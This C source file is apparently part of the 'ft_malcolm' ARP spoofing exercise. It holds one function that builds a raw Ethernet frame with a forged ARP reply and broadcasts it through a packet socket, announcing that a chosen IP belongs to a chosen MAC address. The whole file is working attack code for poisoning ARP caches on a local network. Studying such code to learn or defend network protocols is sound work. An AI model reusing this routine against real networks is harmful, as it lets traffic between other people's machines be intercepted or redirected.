#include "ft_malcolm.h"

void	send_arp_packet(int sock, int ifaceid, t_malcolm *malcolm) {
	struct sockaddr_ll socket_address;
	unsigned char *buf;
	struct ether_header *eth;
	struct arp_packet *arp;
	int len;

	buf = malloc(BUF_SIZE);
	if (!buf) {
		perror("malloc");
		ft_clean_exit(EXIT_FAILURE, sock, NULL);
	}

	eth = (struct ether_header *)buf;
	arp = (struct arp_packet *)(buf + sizeof(struct ether_header));

	// Ethernet header
	ft_memcpy(eth->ether_dhost, malcolm->target_mac_conv, ETH_ALEN);
	ft_memcpy(eth->ether_shost, malcolm->source_mac_conv, ETH_ALEN);
	eth->ether_type = htons(ETH_P_ARP);

	// ARP header
	arp->hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp->hdr.ar_pro = htons(ETH_P_IP);
	arp->hdr.ar_hln = ETH_ALEN;
	arp->hdr.ar_pln = 4;
	arp->hdr.ar_op  = htons(ARPOP_REPLY);


	// ARP payload
	ft_memcpy(arp->sender_mac, malcolm->source_mac_conv, ETH_ALEN);
	ft_memcpy(arp->sender_ip, &malcolm->src_ip_conv.s_addr, 4);
	ft_memcpy(arp->target_mac, malcolm->target_mac_conv, ETH_ALEN);
	ft_memcpy(arp->target_ip, &malcolm->dst_ip_conv.s_addr, 4);

	len = sizeof(struct ether_header) + sizeof(struct arp_packet);

	// Socket setup
	ft_memset(&socket_address, 0, sizeof(socket_address));
	socket_address.sll_halen = ETH_ALEN;
	socket_address.sll_family = AF_PACKET;
	socket_address.sll_ifindex = ifaceid;
	ft_memset(socket_address.sll_addr, 0xff, ETH_ALEN); // broadcast

	print_arp_packet(buf);

	if (sendto(sock, buf, len, 0,
			   (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
		perror("sendto");
		ft_clean_exit(EXIT_FAILURE, sock, buf);
	}

	printf("[+] ARP packet sent pretending that IP %s has MAC %s\n", malcolm->source_ip, malcolm->source_mac);
	free(buf);
}
